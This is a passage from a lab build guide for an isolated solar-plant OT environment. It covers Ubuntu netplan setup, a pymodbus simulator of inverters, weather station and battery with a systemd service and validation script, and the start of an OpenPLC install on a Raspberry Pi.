    ens33:                          # ← REPLACE with your NAT adapter name
      dhcp4: true                   # Keep DHCP on NAT — gives internet access
```

```
           WHY two interfaces in the file:
           - The OT adapter (ens34) gets the static 10.10.10.10 IP
           - The NAT adapter (ens33) keeps DHCP for internet access
           - Both must be in the file; defining only one causes the other
             to lose its IP after netplan apply
           
           Save: Ctrl+X → Y → Enter
           
           Set correct permissions (netplan requires strict file permissions):
           sudo chmod 600 /etc/netplan/10-solar-network.yaml

Step 8.11: Test and apply the configuration:
           sudo netplan try
           
           WHY "netplan try" not "netplan apply":
           "netplan try" applies the config for 120 seconds and auto-reverts
           if you don't confirm. This protects you from losing SSH access
           due to a config error.
           
           If the screen asks "Do you want to keep these settings?":
           Type: yes → Enter
           
           ⚠️ COMMON Ubuntu 24.04.4 WARNING (harmless — ignore it):
           "WARNING:root:Cannot call Open vSwitch: ovsdb-server.service is not running"
           This appears because Ubuntu 24.04 includes Open vSwitch by default.
           It does not affect our configuration. Ignore it.
           
           Verify both adapters have correct IPs:
           ip addr show
           
           Expected output (interface names will match yours):
           ens34: inet 10.10.10.10/24  ← OT static IP — CORRECT
           ens33: inet 192.168.216.xxx  ← NAT DHCP IP — CORRECT
           
           Test OT connectivity (Pi must be connected and powered on):
           ping -c 4 10.10.10.1
           
           Test internet still works via NAT adapter:
           ping -c 3 8.8.8.8
           
           Both must succeed before continuing.

Step 8.12: Install all required packages NOW while NAT internet is available:
           sudo apt update
           sudo apt install -y \
             python3 python3-pip python3-venv python3-full \
             htop curl wget git nano net-tools openssh-server \
             iproute2 iputils-ping
           
           WHY install everything at once: Once the NAT adapter is removed
           (after all setup is done), this VM has no internet. Install ALL
           needed tools now in a single pass. Missing a package later means
           re-adding the NAT adapter — annoying but possible if needed.

Step 8.13: SSH login from WS-A (use this for ALL remaining steps on this VM):
           On WS-A, open Windows Terminal:
           ssh solaradmin@10.10.10.10
           Password: SolarLab2024!
           
           WHY switch to SSH now: Copy-paste works in SSH. The Python scripts
           in Step 10 are hundreds of lines. Typing them in the VMware console
           is impractical. ALL remaining work on this VM should be done via SSH.
           
           ✅ From this point — work in SSH, NOT in the VMware console window.
```

### 🛠️ Troubleshoot: Ubuntu 24.04.4 Network Configuration

```
Problem: netplan try/apply shows YAML parsing error
Fix: YAML is whitespace-sensitive.
     - Indentation MUST use SPACES, not tabs (nano uses spaces by default)
     - Each level is exactly 2 spaces deeper than its parent
     - Interface names are case-sensitive (ens34, not ENS34)
     Validate syntax before applying: sudo nano /etc/netplan/10-solar-network.yaml
     Look for any lines that look misaligned.

Problem: "netplan try" says "No such file" or cannot find renderer
Fix: Ubuntu 24.04.4 Server should have systemd-networkd running.
     Check: sudo systemctl status systemd-networkd
     If stopped: sudo systemctl enable --now systemd-networkd
     Then retry: sudo netplan try

Problem: After netplan apply — OT IP (10.10.10.10) not appearing
Fix: Check interface name. Run: ip link show
     Find the interface with no IP (not ens33 if ens33 has the NAT IP).
     Open: sudo nano /etc/netplan/10-solar-network.yaml
     Replace the OT interface name in the file with the correct one.
     Save → sudo netplan try → confirm

Problem: NAT adapter loses DHCP IP after netplan apply
Fix: Your netplan file is only configuring the OT adapter, not the NAT adapter.
     Both interfaces MUST appear in the netplan file.
     Open the yaml file and add the NAT interface with "dhcp4: true"
     (See Step 8.10 format above).

Problem: /etc/netplan/ directory is EMPTY and Step 8.9 says "no files"
Fix: This is NORMAL on Ubuntu 24.04.4 Server. Nothing is wrong.
     Skip straight to Step 8.10 — create the file from scratch.
     No renaming or backup step is needed.

Problem: SSH connection refused from WS-A
Fix: OpenSSH might not have installed (check Step 8.6 Screen 10).
     In the VMware console on the VM:
     sudo apt install -y openssh-server
     sudo systemctl enable --now ssh
     Verify: sudo systemctl status ssh  → should show "active (running)"
     Then retry SSH from WS-A: ssh solaradmin@10.10.10.10

Problem: Package installation fails — "unable to reach mirror" / "connect timeout"
Fix: The NAT adapter (VMnet8) is not active or misconfigured.
     Check: ip addr show  → look for a 192.168.216.x IP
     If missing: Check VMware VM settings → Network Adapter 2 → VMnet8
     If VMnet8 shows "Connected" but still no internet:
     sudo dhclient <NAT_interface_name>   ← manually request DHCP
     Then retry: ping 8.8.8.8
```

---

## STEP 9: Install Python Libraries for Modbus (Ubuntu 24.04 Method)

### 🔵 The Ubuntu 24.04 Python Environment Change

Ubuntu 24.04 introduced a significant change: **system pip is disabled by default**. If you try to run `pip install` directly, you get:

```
error: externally-managed-environment
× This environment is managed by the system package manager.
```

This is intentional — Ubuntu 24.04 enforces Python virtual environments to prevent system Python from being modified by pip. We follow this best practice correctly.

### 🟢 Action: Set Up Python Virtual Environment

```
Step 9.1: SSH to Field-Simulator VM from WS-A (if not already connected):
          ssh solaradmin@10.10.10.10
          Password: SolarLab2024!
          
          ✅ Confirm internet is still available (NAT adapter active):
          ping -c 2 8.8.8.8
          If this fails — troubleshoot NAT adapter before continuing.
          ALL apt and pip commands below REQUIRE internet.

Step 9.2: Install Python tools (internet required — NAT adapter must be active):
          sudo apt update
          sudo apt install -y python3 python3-pip python3-venv \
            python3-full htop curl wget git nano net-tools
          
          UBUNTU 24.04 NOTE: python3 is 3.12 by default.
          This is different from Ubuntu 22.04 (Python 3.10).
          Our code is compatible with Python 3.12.

Step 9.3: Create the project directory:
          mkdir -p ~/solar_plant/{field_devices,logs,tests,configs}
          
          WHY this structure:
          field_devices/ → production Python scripts
          logs/          → service logs (separate from /var/log)
          tests/         → validation and test scripts
          configs/       → configuration files

Step 9.4: Create a Python virtual environment for the project:
          python3 -m venv ~/solar_plant/.venv
          
          WHY venv: Python 3.12 (Ubuntu 24.04) requires this.
          A venv creates an isolated Python environment where pip install
          works without affecting system Python.
          Think of it as a clean Python installation just for this project.
          
          Activate the virtual environment:
          source ~/solar_plant/.venv/bin/activate
          
          Your prompt changes to: (.venv) solaradmin@field-simulator:~$
          The (.venv) prefix shows the venv is active.

Step 9.5: Install Python libraries inside the venv:
          pip install pymodbus==3.6.9
          
          WHY pin version ==3.6.9: pymodbus changed its API significantly
          between 2.x, 3.x, and 3.6.x. Our code is written for the 3.6.x API.
          Pinning prevents pip from silently installing a breaking version.
          
          pip install influxdb-client
          pip install numpy
          
          WHY numpy: Solar physics calculations (irradiance, temperature
          derating) use mathematical functions that numpy accelerates.
          Also provides better Gaussian noise generation for realistic
          sensor simulation.

Step 9.6: Verify installations:
          python3 -c "import pymodbus; print('pymodbus version:', pymodbus.__version__)"
          Expected: pymodbus version: 3.6.9
          
          python3 -c "import numpy; print('numpy OK')"
          Expected: numpy OK

Step 9.7: Create a venv activation script for convenience:
          cat > ~/solar_plant/activate.sh << 'EOF'
          #!/bin/bash
          # Activate solar plant Python environment
          source /home/solaradmin/solar_plant/.venv/bin/activate
          echo "Solar plant venv activated. Python: $(python3 --version)"
          EOF
          chmod +x ~/solar_plant/activate.sh
          
          WHY: Makes it easy to re-activate the venv after logging out:
          source ~/solar_plant/activate.sh

Step 9.8: Deactivate venv for now (we'll re-activate when deploying code):
          deactivate
```

### 🛠️ Troubleshoot: Python/pip Issues on Ubuntu 24.04

```
Problem: "error: externally-managed-environment" when using pip
Fix: You're using system pip, not venv pip.
     Activate the venv first: source ~/solar_plant/.venv/bin/activate
     Then retry the pip install command.
     The (.venv) prefix in your prompt confirms the venv is active.

Problem: python3 -m venv fails: "No module named venv"
Fix: sudo apt install -y python3-venv
     Then retry the venv creation step.

Problem: pip install pymodbus succeeds but import fails
Fix: You may have installed into a different Python.
     Verify: which python3  (should show path inside .venv)
     If it shows /usr/bin/python3 → venv is not active.
     Run: source ~/solar_plant/.venv/bin/activate first.

Problem: numpy installation fails with compilation errors
Fix: sudo apt install -y python3-dev build-essential
     Then retry: pip install numpy
```

---

## STEP 10: Deploy the Field Device Simulator Code

### 🔵 Why This Simulator is Realistic

The Python code we deploy is not random number generation. It implements:

1. **Real Modbus TCP protocol** — pymodbus handles actual Modbus framing, register addressing, TCP connection management
2. **Real solar physics** — irradiance follows IEC 61215 NOCT model, power output includes temperature derating (-0.4%/°C silicon coefficient)
3. **Real register maps** — register addresses match actual Fronius/SMA inverter Modbus documentation
4. **Real fault injection** — 0.05% per-second fault rate matches real MTBF statistics for solar inverters
5. **Day/night cycle** — power drops to zero at night (sine function of time-of-day)

### 🟢 Action: Create the Field Simulator

```
Step 10.1: Activate the venv:
           source ~/solar_plant/.venv/bin/activate
           cd ~/solar_plant/field_devices

Step 10.2: Create the main simulator file:
           nano solar_field_simulator.py
           
           Paste the complete code below (in VMware: copy from Windows,
           right-click in the console window to paste):
```

```python
#!/usr/bin/env python3
"""
Solar Plant Field Device Simulator
Simulates 4 inverters, 1 weather station, 1 battery system via Modbus TCP
Protocol: Modbus TCP (IEC 61158)
Compatible with: pymodbus 3.6.x
"""

import threading
import time
import math
import random
import logging
from datetime import datetime
from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────
# SOLAR PHYSICS MODELS
# ─────────────────────────────────────────────────────────────────

def get_solar_irradiance():
    """Calculate solar irradiance based on time of day (W/m²).
    Model: Sinusoidal approximation of clear-sky irradiance.
    Range: 0 W/m² (night) to 1000 W/m² (solar noon).
    """
    now = datetime.now()
    hour_decimal = now.hour + now.minute / 60.0
    # Solar window: 6 AM to 6 PM (12 hours)
    if hour_decimal < 6 or hour_decimal > 18:
        return 0.0
    angle = math.pi * (hour_decimal - 6) / 12.0
    base_irradiance = 1000.0 * math.sin(angle)
    # Cloud simulation: random attenuation 0-30%
    cloud_factor = random.gauss(0.95, 0.05)
    cloud_factor = max(0.65, min(1.0, cloud_factor))
    return max(0.0, base_irradiance * cloud_factor)

def get_ambient_temperature():
    """Simulate ambient temperature (°C). Peaks at 35°C at 14:00."""
    hour = datetime.now().hour + datetime.now().minute / 60.0
    base = 22.0  # overnight minimum
    peak_delta = 13.0  # peak rise above base
    # Peak at 14:00 (2 PM)
    angle = math.pi * (hour - 6) / 12.0 if 6 <= hour <= 20 else 0
    temp = base + peak_delta * max(0, math.sin(angle - math.pi * 2 / 12))
    return temp + random.gauss(0, 0.3)

def calculate_panel_temperature(ambient_temp, irradiance):
    """NOCT model (IEC 61215): T_module = T_ambient + (NOCT-20)/800 × G
    NOCT = 45°C (standard rating for most crystalline silicon panels)
    """
    NOCT = 45.0
    return ambient_temp + (NOCT - 20.0) / 800.0 * irradiance

def calculate_power_output(irradiance, panel_temp, rated_power_w):
    """Power output with temperature derating.
    Temperature coefficient: -0.4%/°C above 25°C (IEC 61215 standard).
    """
    if irradiance <= 0:
        return 0.0
    irradiance_factor = irradiance / 1000.0
    temp_derating = 1.0 - 0.004 * max(0, panel_temp - 25.0)
    temp_derating = max(0.5, temp_derating)  # Never derate below 50%
    output = rated_power_w * irradiance_factor * temp_derating
    # Add ±1% noise for realistic sensor variation
    output *= random.gauss(1.0, 0.01)
    return max(0.0, output)

# ─────────────────────────────────────────────────────────────────
# INVERTER DEVICE CLASS
# ─────────────────────────────────────────────────────────────────

class SolarInverter:
    """Represents one 250 kW solar inverter.
    
    Modbus Register Map (Holding Registers, Function Code 03):
    Reg 0:  DC Voltage × 10 (e.g., 3800 = 380.0 V)
    Reg 1:  DC Current × 10 (e.g., 6580 = 658.0 A)
    Reg 2:  DC Power in W (high word)
    Reg 3:  DC Power in W (low word)  — combined: 32-bit integer
    Reg 4:  AC Active Power in W (high word)
    Reg 5:  AC Active Power in W (low word)
    Reg 6:  AC Voltage × 10 (e.g., 2300 = 230.0 V)
    Reg 7:  Panel Temperature × 10 (e.g., 473 = 47.3°C)
    Reg 8:  Inverter Status: 0=Off, 1=Running, 2=Fault, 3=Throttled
    Reg 9:  Total Energy kWh (high word)
    Reg 10: Total Energy kWh (low word)
    Reg 11: Fault Code (0 = no fault)
    Reg 20: Power Limit % (writable by PLC: 0-100)
    """

    def __init__(self, inverter_id, rated_power_w=250000):
        self.id = inverter_id
        self.rated_power_w = rated_power_w
        self.total_energy_kwh = random.randint(50000, 200000)  # Historical energy
        self.fault_code = 0
        self.power_limit_pct = 100  # Writable by PLC/SCADA
        self.status = 1  # Running by default

    def update_registers(self, context, slave_id):
        irradiance = get_solar_irradiance()
        ambient = get_ambient_temperature()
        panel_temp = calculate_panel_temperature(ambient, irradiance)
        
        # Check power limit (written by PLC via Modbus write)
        power_limit_raw = context[slave_id].getValues(3, 20, count=1)[0]
        self.power_limit_pct = max(0, min(100, power_limit_raw or 100))
        
        # Random fault injection (0.05% chance per update)
        if random.random() < 0.0005 and irradiance > 0:
            self.fault_code = random.choice([21, 33, 47])  # Sample fault codes
            self.status = 2  # Fault status
        elif self.status == 2 and random.random() < 0.1:
            self.fault_code = 0  # Auto-recovery 10% chance per update
            self.status = 1
        
        # Calculate power
        if irradiance <= 0:
            self.status = 0  # Off at night
            ac_power = 0
        elif self.status != 2:
            self.status = 1 if self.power_limit_pct >= 100 else 3
            ac_power = int(calculate_power_output(irradiance, panel_temp, self.rated_power_w)
                           * (self.power_limit_pct / 100.0))
        else:
            ac_power = 0
        
        # Update energy counter (kWh)
        if ac_power > 0:
            self.total_energy_kwh += ac_power / (3600 * 1000)  # Wh per second → kWh
        
        # Build register values
        dc_voltage = int(380.0 * 10 + random.gauss(0, 5)) if ac_power > 0 else 0
        dc_current = int((ac_power / 380.0) * 10) if ac_power > 0 else 0
        dc_power = int(ac_power * 1.03)  # DC power slightly higher (inverter loss)
        ac_voltage = int(230.0 * 10 + random.gauss(0, 2)) if ac_power > 0 else 0
        temp_reg = int(panel_temp * 10) if irradiance > 0 else int(ambient * 10)
        energy_int = int(self.total_energy_kwh)
        
        registers = [
            dc_voltage & 0xFFFF,          # Reg 0: DC Voltage
            dc_current & 0xFFFF,          # Reg 1: DC Current
            (dc_power >> 16) & 0xFFFF,    # Reg 2: DC Power high
            dc_power & 0xFFFF,            # Reg 3: DC Power low
            (ac_power >> 16) & 0xFFFF,    # Reg 4: AC Power high
            ac_power & 0xFFFF,            # Reg 5: AC Power low
            ac_voltage & 0xFFFF,          # Reg 6: AC Voltage
            temp_reg & 0xFFFF,            # Reg 7: Panel temperature
            self.status,                  # Reg 8: Status
            (energy_int >> 16) & 0xFFFF,  # Reg 9: Energy high
            energy_int & 0xFFFF,          # Reg 10: Energy low
            self.fault_code,              # Reg 11: Fault code
        ]
        
        # Set registers 0-11
        context[slave_id].setValues(3, 0, registers)
        # Note: Reg 20 (power limit) is writeable — don't overwrite it
        
        if ac_power > 0:
            logger.debug(f"Inverter-{self.id}: {ac_power/1000:.1f} kW | "
                        f"Temp: {panel_temp:.1f}°C | Status: {self.status}")


class WeatherStation:
    """Weather station Modbus registers.
    Reg 0: Irradiance W/m² (direct reading)
    Reg 1: Ambient temperature × 10
    Reg 2: Wind speed × 10 (m/s)
    Reg 3: Humidity (%)
    Reg 4: Panel temperature (average) × 10
    """
    
    def update_registers(self, context, slave_id):
        irradiance = get_solar_irradiance()
        ambient = get_ambient_temperature()
        wind_speed = max(0, random.gauss(3.5, 1.2))  # m/s, avg 3.5
        humidity = max(20, min(95, random.gauss(60, 15)))  # %
        avg_panel_temp = calculate_panel_temperature(ambient, irradiance)
        
        registers = [
            int(irradiance),
            int(ambient * 10),
            int(wind_speed * 10),
            int(humidity),
            int(avg_panel_temp * 10),
        ]
        context[slave_id].setValues(3, 0, registers)


class BatterySystem:
    """Battery Energy Storage System (BESS) Modbus registers.
    Reg 0: State of Charge % (0-100)
    Reg 1: Battery voltage × 10
    Reg 2: Charge/discharge power W (+ = charging, - = discharging → stored as 32768 + value)
    Reg 3: Battery temperature × 10
    Reg 4: Mode: 0=Standby, 1=Charging, 2=Discharging, 3=Fault
    """
    
    def __init__(self):
        self.soc = random.randint(40, 80)  # Start at 40-80% SOC
    
    def update_registers(self, context, slave_id):
        irradiance = get_solar_irradiance()
        # Charge during high irradiance, discharge at night
        if irradiance > 700 and self.soc < 95:
            mode = 1  # Charging
            power = int(50000 + random.gauss(0, 2000))  # 50 kW charging
            self.soc = min(100, self.soc + 0.001)
        elif irradiance < 100 and self.soc > 20:
            mode = 2  # Discharging
            power = int(-(30000 + random.gauss(0, 1000)))  # 30 kW discharge
            self.soc = max(0, self.soc - 0.001)
        else:
            mode = 0  # Standby
            power = 0
        
        voltage = int(48.0 * 10 + random.gauss(0, 2))
        temp = int((25 + random.gauss(0, 2)) * 10)
        power_reg = int(power + 32768) & 0xFFFF  # Offset for signed integer
        
        registers = [
            int(self.soc),
            voltage,
            power_reg,
            temp,
            mode,
        ]
        context[slave_id].setValues(3, 0, registers)


# ─────────────────────────────────────────────────────────────────
# MODBUS SERVER SETUP
# ─────────────────────────────────────────────────────────────────

def create_modbus_context(num_registers=100):
    """Create a Modbus datastore with zeroed registers."""
    store = ModbusSlaveContext(
        hr=ModbusSequentialDataBlock(0, [0] * num_registers),
        ir=ModbusSequentialDataBlock(0, [0] * num_registers),
        co=ModbusSequentialDataBlock(0, [False] * num_registers),
        di=ModbusSequentialDataBlock(0, [False] * num_registers),
    )
    return ModbusServerContext(slaves={1: store}, single=False)

def update_loop(device, context, slave_id, interval=1.0):
    """Background thread: updates device registers every `interval` seconds."""
    while True:
        try:
            device.update_registers(context, slave_id)
        except Exception as e:
            logger.error(f"Update error for device on slave {slave_id}: {e}")
        time.sleep(interval)

def start_modbus_server(context, host, port, description):
    """Start a Modbus TCP server in a daemon thread."""
    logger.info(f"Starting {description} on {host}:{port}")
    try:
        StartTcpServer(context=context, address=(host, port))
    except Exception as e:
        logger.error(f"Server {description} failed: {e}")

# ─────────────────────────────────────────────────────────────────
# MAIN ENTRY POINT
# ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    HOST = "0.0.0.0"  # Listen on all interfaces
    logger.info("=" * 60)
    logger.info("Solar Plant Field Device Simulator Starting")
    logger.info(f"Timestamp: {datetime.now()}")
    logger.info("=" * 60)
    
    # Initialize 4 inverters
    inverters = [SolarInverter(i, rated_power_w=250000) for i in range(1, 5)]
    weather = WeatherStation()
    battery = BatterySystem()
    
    # Create individual Modbus contexts for each device
    inv_contexts = [create_modbus_context() for _ in range(4)]
    weather_context = create_modbus_context()
    battery_context = create_modbus_context()
    
    # Start update threads (background — updates registers every second)
    for i, (inv, ctx) in enumerate(zip(inverters, inv_contexts)):
        t = threading.Thread(target=update_loop, args=(inv, ctx, 1), daemon=True)
        t.start()
        logger.info(f"Inverter-{i+1} update thread started")
    
    wt = threading.Thread(target=update_loop, args=(weather, weather_context, 1), daemon=True)
    wt.start()
    
    bt = threading.Thread(target=update_loop, args=(battery, battery_context, 1), daemon=True)
    bt.start()
    
    # Start Modbus TCP servers (one per device on different ports)
    # Inverters on ports 5501-5504, weather on 5510, battery on 5520
    server_configs = [
        (inv_contexts[0], HOST, 5501, "Inverter-1"),
        (inv_contexts[1], HOST, 5502, "Inverter-2"),
        (inv_contexts[2], HOST, 5503, "Inverter-3"),
        (inv_contexts[3], HOST, 5504, "Inverter-4"),
        (weather_context, HOST, 5510, "WeatherStation"),
        (battery_context, HOST, 5520, "BatterySystem"),
    ]
    
    # Start all servers except last one in daemon threads
    for ctx, host, port, desc in server_configs[:-1]:
        t = threading.Thread(target=start_modbus_server, args=(ctx, host, port, desc), daemon=True)
        t.start()
        time.sleep(0.1)  # Small delay between server starts
    
    # Last server runs in main thread (keeps program alive)
    ctx, host, port, desc = server_configs[-1]
    logger.info(f"All simulators running. Starting final server: {desc}")
    start_modbus_server(ctx, host, port, desc)
```

```
Step 10.3: Save the file: Ctrl+X → Y → Enter

Step 10.4: Set execute permissions:
           chmod +x ~/solar_plant/field_devices/solar_field_simulator.py

Step 10.5: Create systemd service for auto-start:
           sudo nano /etc/systemd/system/field-simulator.service
```

```ini
[Unit]
Description=Solar Plant Field Device Simulator
Documentation=https://github.com/your-repo/solar-guard
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=60
StartLimitBurst=3

[Service]
Type=simple
User=solaradmin
WorkingDirectory=/home/solaradmin/solar_plant/field_devices
ExecStart=/home/solaradmin/solar_plant/.venv/bin/python3 \
    /home/solaradmin/solar_plant/field_devices/solar_field_simulator.py
Restart=on-failure
RestartSec=10
StandardOutput=append:/home/solaradmin/solar_plant/logs/field_sim.log
StandardError=append:/home/solaradmin/solar_plant/logs/field_sim_error.log

# Security hardening
NoNewPrivileges=yes
ProtectSystem=strict
ReadWritePaths=/home/solaradmin/solar_plant/logs

[Install]
WantedBy=multi-user.target
```

```
           WHY .venv/bin/python3 (not just python3):
           systemd runs as root and uses a minimal PATH.
           Specifying the full venv path ensures the correct Python
           interpreter with all our installed packages is used.
           
           If you use just "python3", systemd uses the system Python
           which doesn't have pymodbus installed → service crashes.

Step 10.6: Enable and start the service:
           sudo systemctl daemon-reload
           sudo systemctl enable field-simulator
           sudo systemctl start field-simulator
           
           Check status:
           sudo systemctl status field-simulator
           
           Expected output:
           ● field-simulator.service - Solar Plant Field Device Simulator
                Loaded: loaded (/etc/systemd/system/field-simulator.service; enabled)
                Active: active (running) since [timestamp]
                  Main PID: XXXX
           
           If "Active: failed": 
           sudo journalctl -u field-simulator -n 30 --no-pager
           This shows the exact Python error. Most common: venv path wrong or
           pymodbus import error (not activated venv in service).

Step 10.7: 🔴 REMOVE THE TEMPORARY NAT ADAPTER — MANDATORY SECURITY STEP
           All packages are installed. The Field-Simulator must now be isolated.
           
           sudo poweroff
           
           Wait for the VM to fully shut down.
           
           In VMware Workstation:
           Right-click Field-Simulator → Settings
           Click "Network Adapter 2" (the VMnet8/NAT one — shows 192.168.216.x)
           Click "Remove" at the bottom → OK
           
           Power the VM back on.
           
           After login, verify ONLY the OT adapter remains:
           ip addr show
           Expected: Only ens34 (or your OT interface) with 10.10.10.10
                     NO 192.168.216.x address
           
           Test OT connectivity is still working:
           ping -c 4 10.10.10.1    ← Pi must reply
           
           WHY this step is mandatory:
           An isolated OT device with a permanent internet connection can
           be reached by anyone on the internet (via NAT traversal), bypasses
           your pfSense segmentation, and contradicts OT security principles.
           The Field-Simulator must be reachable ONLY from within the OT network.
```

---

## STEP 11: Validate Level 0

### 🔵 Why Validation is Non-Negotiable

Build the PLC only AFTER confirming field devices work. The PLC silently fails if Level 0 doesn't respond. You'll waste hours debugging the PLC when the real problem was the simulator.

### 🟢 Action: Validation Tests

```
Step 11.1: Check all 6 Modbus ports are listening:
           ss -tlnp | grep -E "5501|5502|5503|5504|5510|5520"
           
           Expected: 6 LISTEN lines. Example:
           LISTEN 0 128 0.0.0.0:5501 0.0.0.0:* users:(("python3",...))
           LISTEN 0 128 0.0.0.0:5502 0.0.0.0:*
           ... (5503, 5504, 5510, 5520)

Step 11.2: Create and run test script:
           source ~/solar_plant/.venv/bin/activate
           nano ~/solar_plant/tests/test_modbus.py
```

```python
#!/usr/bin/env python3
"""Level 0 validation test - reads all field devices."""
from pymodbus.client import ModbusTcpClient
import sys

def test_device(host, port, name, registers=12):
    c = ModbusTcpClient(host, port=port, timeout=5)
    if not c.connect():
        print(f"  ✗ {name}: FAILED — cannot connect to {host}:{port}")
        return False
    result = c.read_holding_registers(0, registers, slave=1)
    if result.isError():
        print(f"  ✗ {name}: FAILED — Modbus error: {result}")
        c.close()
        return False
    r = result.registers
    if name.startswith("Inverter"):
        ac_power = (r[4] << 16) | r[5]
        status_names = ["Off", "Running", "Fault", "Throttled"]
        status = status_names[r[8]] if r[8] < 4 else f"Unknown({r[8]})"
        print(f"  ✓ {name}: DC={r[0]/10:.1f}V | AC={ac_power/1000:.1f}kW | "
              f"Temp={r[7]/10:.1f}°C | Status={status}")
    elif name == "WeatherStation":
        print(f"  ✓ {name}: Irradiance={r[0]}W/m² | "
              f"Ambient={r[1]/10:.1f}°C | Wind={r[2]/10:.1f}m/s")
    elif name == "BatterySystem":
        print(f"  ✓ {name}: SOC={r[0]}% | Mode={['Standby','Charging','Discharging','Fault'][r[4]]}")
    c.close()
    return True

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    print(f"\nLevel 0 Validation — Testing field devices at {host}")
    print("=" * 60)
    results = []
    for i in range(1, 5):
        results.append(test_device(host, 5500+i, f"Inverter-{i}"))
    results.append(test_device(host, 5510, "WeatherStation", registers=5))
    results.append(test_device(host, 5520, "BatterySystem", registers=5))
    print("=" * 60)
    passed = sum(results)
    total = len(results)
    print(f"Result: {passed}/{total} devices PASSED")
    if passed == total:
        print("✅ Level 0 VALIDATED — safe to build Level 1 (PLC)")
    else:
        print("❌ Level 0 FAILED — fix issues before building PLC")
```

```
           python3 ~/solar_plant/tests/test_modbus.py
           
           Expected (during daytime):
           Level 0 Validation — Testing field devices at localhost
           ============================================================
             ✓ Inverter-1: DC=380.3V | AC=213.4kW | Temp=47.2°C | Status=Running
             ✓ Inverter-2: DC=381.1V | AC=209.8kW | Temp=46.9°C | Status=Running
             ✓ Inverter-3: DC=379.8V | AC=211.2kW | Temp=47.5°C | Status=Running
             ✓ Inverter-4: DC=380.5V | AC=214.0kW | Temp=47.1°C | Status=Running
             ✓ WeatherStation: Irradiance=852W/m² | Ambient=31.2°C | Wind=3.4m/s
             ✓ BatterySystem: SOC=67% | Mode=Charging
           ============================================================
           Result: 6/6 devices PASSED
           ✅ Level 0 VALIDATED — safe to build Level 1 (PLC)
           
           NOTE: During nighttime (18:00-06:00), inverters will show
           AC=0.0kW and Status=Off — this is CORRECT. Try again after 6 AM.
```

### 🟡 Verify: Level 0 Checkpoint

```
[ ] systemctl status field-simulator → "active (running)"
[ ] All 6 ports (5501-5504, 5510, 5520) show LISTEN in ss output
[ ] Test script: 6/6 devices PASSED
[ ] Simulator logs updating (tail -f ~/solar_plant/logs/field_sim.log)
[ ] No Python exceptions in error log (cat ~/solar_plant/logs/field_sim_error.log)

🔴 DO NOT BUILD LEVEL 1 until all items are checked.
```

---

# ═══════════════════════════════════════════════════
# PHASE 2 — LEVEL 1: RASPBERRY PI PLC
# ═══════════════════════════════════════════════════

## STEP 12: Install OpenPLC Runtime on Raspberry Pi

### 🔵 What OpenPLC Does (And Why It's the Right Choice)

OpenPLC Runtime is an open-source PLC runtime created by Thiago Alves (University of Alabama). It implements IEC 61131-3 — the international standard governing ALL real PLCs from Siemens, Allen Bradley, Schneider, ABB, and Mitsubishi.

Running on our Pi, OpenPLC provides:
- **Real Modbus TCP master** — actively polls field devices every scan cycle
- **Real IEC 61131-3 execution engine** — runs Structured Text programs like real PLCs
- **Real Modbus slave** — SCADA polls the Pi just like a real Siemens S7-1200
- **Web UI** — upload programs, monitor I/O live, view PLC status

**Gap vs. real PLC:** OpenPLC scan cycle is ~100-500ms vs. 10-50ms on industrial hardware. Perfectly adequate for monitoring; not sufficient for millisecond-precision control.

### 🟢 Action: Install OpenPLC on Raspberry Pi

```
Step 12.1: SSH to Raspberry Pi:
           ssh pi@10.10.10.1
           Password: SolarPLC2024!

Step 12.2: Install build dependencies:
           sudo apt update
           sudo apt install -y git build-essential python3 python3-pip \
             sqlite3 curl wget libssl-dev libffi-dev
           
           WHY these packages:
           git → download OpenPLC source code from GitHub
           build-essential → C/C++ compiler tools (OpenPLC runtime is C++)
           sqlite3 → OpenPLC uses SQLite for program/configuration storage
           libssl-dev → OpenPLC's web server uses HTTPS

Step 12.3: Clone OpenPLC Runtime repository:
           cd ~
           git clone https://github.com/thiagoralves/OpenPLC_v3.git
           cd OpenPLC_v3
           
           WHY clone (not binary package): OpenPLC's installer script
           compiles the runtime specifically for your Pi's architecture.
           The compilation ensures optimal ARM performance and correct
           hardware integration.

Step 12.4: Run the installer:
           ./install.sh rpi
           
           CRITICAL: This takes 15-45 minutes. Do NOT close SSH session.
           The Pi is compiling the entire OpenPLC runtime from C++ source.
           
           What "rpi" flag does: Enables Raspberry Pi GPIO support,
           configures the correct ARM compiler flags, installs Pi-specific
           hardware libraries for the I/O pins.
           
           Watch the output. Common things you'll see:
           - cmake configuration messages (normal)
           - C++ compilation lines (lots of them — normal)
           - Python package installations
           
           SUCCESS indicator at the end:
           "OpenPLC was installed successfully!"
           OR the script exits without error messages.
           
           If it hangs for 30+ minutes at the same line:
           → Ctrl+C, then try: sudo apt install -y cmake
           → Then re-run: ./install.sh rpi

Step 12.5: Start OpenPLC service:
           sudo systemctl enable openplc
           sudo systemctl start openplc
           
           Verify:
           sudo systemctl status openplc
           Expected: active (running) for openplc.service

Step 12.6: Access OpenPLC web interface:
           OpenPLC runs on port 8080 of the Raspberry Pi.
           
           OPTION A — If you're on WS-A and have direct access to 10.10.10.1:
           Open a browser on WS-A and go to: http://10.10.10.1:8080
           Login: openplc / openplc  (change this immediately)
           
           OPTION B — Via SSH tunnel (more secure):
           On WS-A PowerShell:
           ssh -L 8080:localhost:8080 pi@10.10.10.1
           
           Then open browser on WS-A: http://localhost:8080
           Login: openplc / openplc
           
           FIRST THING: Go to Users → click "openplc" user → Change password
           New password: SolarPLC2024!
           WHY immediately change: Default credentials on a network-accessible
           service is the most common OT security vulnerability.
```

### 🛠️ Troubleshoot: OpenPLC Installation

```
Problem: ./install.sh fails with "cmake not found"
Fix: sudo apt install -y cmake
    Then re-run ./install.sh rpi

Problem: Compilation fails with "out of memory" errors
Fix: Pi is running out of RAM during compilation.
    Add swap space:
    sudo dphys-swapfile swapoff
    sudo nano /etc/dphys-swapfile → change CONF_SWAPSIZE=100 to CONF_SWAPSIZE=1024
    sudo dphys-swapfile setup
    sudo dphys-swapfile swapon
    Then retry ./install.sh rpi

Problem: OpenPLC starts but web UI is unreachable (port 8080)
Fix: sudo ufw status → if "active", run:
    sudo ufw allow 8080/tcp
